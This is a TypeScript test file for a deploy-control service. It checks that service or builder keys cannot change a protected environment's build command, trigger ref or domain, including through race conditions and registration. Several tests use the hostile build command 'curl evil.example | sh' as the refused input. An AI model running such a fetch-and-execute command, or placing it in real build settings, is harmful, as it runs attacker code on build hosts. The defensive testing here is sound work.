// A key cannot redirect what a deploy of a protected environment runs (ADR-0050 §4): not with an update interleaved
// with a person's, not when a protection or a stricter mode lands between its check and its write, and not by
// registering the app. Through the real RPC router and the shipped SQL, on SQLite always and on Postgres when
// FABRIKA_TEST_POSTGRES_URL is set.

import type { AuthContext } from '@fabrika/auth'
import { type ApprovalPolicy, STRICT_POLICY } from '@fabrika/control-contract'
import { type SqlDatabase, SqlDeployLocks } from '@fabrika/platform'
import type { ControlProvider } from '@fabrika/provider-contract'
import { afterEach, describe, expect, test } from 'bun:test'
import { storedPolicy } from '../approval/categories'
import { ControlRegistryRepository, type ControlRepositories, createControlRepositories } from '../db'
import type { ControlRpcDeps } from '../services'
import { createHarness } from './helpers/harness'
import { authWithActions } from './helpers/iam'
import { fixtureProtect } from './helpers/lock'
import { createPostgres, hasPostgres, skipReason } from './helpers/postgres'
import { fakeControlProvider, providerEnvironment } from './helpers/provider'
import { rpcRequest, rpcResult } from './helpers/rpc'

if (!hasPostgres) console.warn(`protected-redirect.test.ts Postgres half ${skipReason}`)

/** The registry as shipped, with a step a test runs right before the next `updateApp` writes: another caller's change. */
class InterleavedRegistry extends ControlRegistryRepository {
	beforeWrite: (() => Promise<void>) | null = null

	override async updateApp(...args: Parameters<ControlRegistryRepository['updateApp']>): ReturnType<ControlRegistryRepository['updateApp']> {
		const step = this.beforeWrite
		this.beforeWrite = null
		if (step !== null) await step()
		return await super.updateApp(...args)
	}
}

interface Backend {
	db: SqlDatabase
	close(): Promise<void>
}

const backends: { name: string; skip: boolean; open(): Promise<Backend> }[] = [
	{
		name: 'sqlite',
		skip: false,
		open: () => {
			const harness = createHarness()
			return Promise.resolve({ db: harness.d1, close: () => Promise.resolve(harness.sqlite.close()) })
		},
	},
	{
		name: 'postgres',
		skip: !hasPostgres,
		open: async () => {
			const fixture = await createPostgres('control_protected_redirect')
			return { db: fixture.db, close: () => fixture.close() }
		},
	},
]

const manager = authWithActions(['app.manage'], 'op@fabrika.test')
const key: AuthContext = { ...manager, principal: { id: 'svc', type: 'service', label: 'builder' } }
const envelopes = {
	target: { provider: 'harbor', version: 1, payload: { kind: 'target' } },
	artifact: { provider: 'harbor', version: 1, payload: { kind: 'artifact' } },
}
const refusal = (env: string, change: string) =>
	`environment \`${env}\` is protected: only a person changes ${change}, which decides what a deploy there runs; `
	+ 'an agent, a builder key or a service key cannot'

for (const backend of backends) {
	describe.skipIf(backend.skip)(`a key cannot redirect a protected environment (${backend.name})`, () => {
		let opened: Backend | null = null

		afterEach(async () => {
			await opened?.close()
			opened = null
		})

		async function open() {
			const b = await backend.open()
			opened = b
			const registry = new InterleavedRegistry(b.db)
			const repositories: ControlRepositories = { ...createControlRepositories(b.db), registry }
			const as = (auth: AuthContext): ControlRpcDeps => ({
				repositories,
				auth,
				queue: { send: () => Promise.resolve() },
				logs: { get: () => Promise.resolve(null) },
				provider: fakeControlProvider,
				cancelRun: () => Promise.resolve(),
			})
			const update = (auth: AuthContext, app: Record<string, string | null>) =>
				rpcResult(rpcRequest('apps.update', { appId: 'app', app }), as(auth), { consoleOrigin: 'https://control.test' })
			const protect = async (env: string, value = true, policy: ApprovalPolicy = STRICT_POLICY) =>
				expect((await fixtureProtect(registry, new SqlDeployLocks(b.db), { appId: 'app', env }, value, Date.now, storedPolicy(policy)))?.protected)
					.toBe(value ? 1 : 0)
			return { registry, as, update, protect }
		}

		test("a key's stale update leaves a person's change in place, since it writes only what it changes", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'prod', { triggerRef: 'refs/heads/main' }))
			// `registry: off` lets the key's write through the gate (ADR-0083 §3).
			await f.protect('prod', true, { ...STRICT_POLICY, registry: 'off' })
			// The key read `bun run build` and sends it again; a person changes it before the key's write.
			f.registry.beforeWrite = async () => {
				expect((await f.update(manager, { buildCmd: 'bun run build:prod' })).status).toBe(200)
			}
			expect((await f.update(key, { buildCmd: 'bun run build', defaultBranch: 'main' })).status).toBe(200)
			expect(f.registry.beforeWrite).toBeNull()
			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build:prod', default_branch: 'main' })
		})

		test("a protection that lands between a key's check and its write refuses the write", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'stage', { triggerRef: 'refs/heads/develop' }))
			f.registry.beforeWrite = () => f.protect('stage')
			const refused = await f.update(key, { buildCmd: 'curl evil.example | sh' })
			expect(refused.status).toBe(403)
			expect(await refused.text()).toContain(refusal('stage', "its application's buildCmd"))
			expect((await f.registry.getApp('app'))?.build_cmd).toBe('bun run build')

			// A new environment that starts protected counts the same: `prod`.
			await f.protect('stage', false)
			f.registry.beforeWrite = async () => void (await f.registry.upsertAppEnv(providerEnvironment('app', 'prod')))
			const created = await f.update(key, { workerDir: 'apps/other' })
			expect(created.status).toBe(403)
			expect(await created.text()).toContain(`its application's workerDir`)
			expect((await f.registry.getApp('app'))?.worker_dir).toBeNull()
		})

		test("a stricter mode that lands between a key's check and its write refuses the write", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'prod'))
			await f.protect('prod', true, { ...STRICT_POLICY, registry: 'off' })
			f.registry.beforeWrite = () => f.protect('prod', true, STRICT_POLICY)
			const refused = await f.update(key, { buildCmd: 'curl evil.example | sh' })
			expect(refused.status).toBe(403)
			expect(await refused.text()).toContain(refusal('prod', "its application's buildCmd"))
			expect((await f.registry.getApp('app'))?.build_cmd).toBe('bun run build')
		})

		test('a person changes the build of a protected app, also when the protection lands in between', async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'stage'))
			f.registry.beforeWrite = () => f.protect('stage')
			expect((await f.update(manager, { buildCmd: 'bun run build:all', configPath: 'deploy/fabrika.config.ts' })).status).toBe(200)
			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build:all', config_path: 'deploy/fabrika.config.ts' })
		})

		test('only a person registers an app whose environment starts protected with a trigger ref or a domain', async () => {
			const f = await open()
			const register = (auth: AuthContext, env: string, triggerRef: string | null, domain?: string) =>
				rpcResult(
					rpcRequest('register', {
						id: 'app',
						repoUrl: 'github.com/acme/app',
						env,
						triggerRef,
						...(domain === undefined ? {} : { domain }),
						...envelopes,
					}),
					f.as(auth),
				)
			const refused = await register(key, 'prod', 'refs/heads/unreviewed')
			expect(refused.status).toBe(403)
			expect(await refused.text()).toContain(refusal('prod', 'its trigger ref'))
			const withDomain = await register(key, 'prod', null, 'app.example.com')
			expect(withDomain.status).toBe(403)
			expect(await withDomain.text()).toContain('environment `prod` is protected: only a person changes its domain')
			expect(await f.registry.getApp('app')).toBeNull()
			expect(await f.registry.getAppEnv('app', 'prod')).toBeNull()

			// Without a trigger ref, the key registers prod; a person names one.
			expect((await register(key, 'prod', null)).status).toBe(200)
			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ protected: 1, trigger_ref: null })
		})

		test('a person registers an app whose environment starts protected with a domain', async () => {
			const f = await open()
			const registered = await rpcResult(
				rpcRequest('register', { id: 'app', repoUrl: 'github.com/acme/app', env: 'prod', triggerRef: null, domain: 'app.example.com', ...envelopes }),
				f.as(manager),
			)
			expect(registered.status).toBe(200)
			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ protected: 1, domain: 'app.example.com' })
		})

		test('a provider that names a domain the registration did not is refused, so no key gets one past the person rule', async () => {
			const f = await open()
			const provider: ControlProvider = {
				...fakeControlProvider,
				normalizeRegistration: ({ app, environment }) => ({ app, environment: { ...environment, domain: 'app.example.com' } }),
			}
			const refused = await rpcResult(
				rpcRequest('register', { id: 'app', repoUrl: 'github.com/acme/app', env: 'prod', triggerRef: null, ...envelopes }),
				{ ...f.as(key), provider },
			)
			expect(refused.status).toBe(400)
			expect(await refused.text()).toContain('provider returned a registration for different coordinates')
			expect(await f.registry.getAppEnv('app', 'prod')).toBeNull()
		})

		test("a person's own key is a key: with a bearer, the person cannot redirect a protected environment", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'prod', { triggerRef: 'refs/heads/main' }))
			const bearer = (request: Request) => {
				const headers = new Headers(request.headers)
				headers.set('Authorization', 'Bearer px_test')
				return new Request(request, { headers })
			}
			const put = (environment: Record<string, string>) =>
				rpcRequest('apps.environments.put', { appId: 'app', env: 'prod', environment: { ...envelopes, triggerRef: 'refs/heads/main', ...environment } })
			const asPerson = f.as(manager)

			// With a bearer the change waits for a person (ADR-0083 §6): the build and the put each as a request.
			const asked = await rpcResult(bearer(rpcRequest('apps.update', { appId: 'app', app: { buildCmd: 'curl evil.example | sh' } })), asPerson, {
				consoleOrigin: 'https://control.test',
			})
			expect(asked.status).toBe(409)
			expect(await asked.text()).toContain('https://control.test/approvals/requests/')
			const asking = { consoleOrigin: 'https://control.test' }
			expect((await rpcResult(bearer(put({ triggerRef: 'refs/heads/unreviewed' })), asPerson, asking)).status).toBe(409)
			expect((await rpcResult(bearer(put({ domain: 'evil.example' })), asPerson, asking)).status).toBe(409)
			expect((await rpcResult(bearer(put({ publicOrigin: 'https://evil.example' })), asPerson, asking)).status).toBe(409)
			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build' })
			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ trigger_ref: 'refs/heads/main', domain: null, public_origin: null })

			// The same person in the console, without a bearer, makes the change.
			expect((await rpcResult(rpcRequest('apps.update', { appId: 'app', app: { buildCmd: 'bun run build:prod' } }), asPerson)).status).toBe(200)
			expect((await rpcResult(put({ triggerRef: 'refs/heads/release' }), asPerson)).status).toBe(200)
			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ trigger_ref: 'refs/heads/release' })
		})

		test('a person registers a protected environment with a trigger ref, and a key an unprotected one', async () => {
			const f = await open()
			const register = (auth: AuthContext, id: string, env: string) =>
				rpcResult(rpcRequest('register', { id, repoUrl: `github.com/acme/${id}`, env, triggerRef: 'refs/heads/main', ...envelopes }), f.as(auth))
			expect((await register(manager, 'app', 'prod')).status).toBe(200)
			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ protected: 1, trigger_ref: 'refs/heads/main' })
			expect((await register(key, 'other', 'stage')).status).toBe(200)
			expect(await f.registry.getAppEnv('other', 'stage')).toMatchObject({ protected: 0, trigger_ref: 'refs/heads/main' })
		})
	})
}
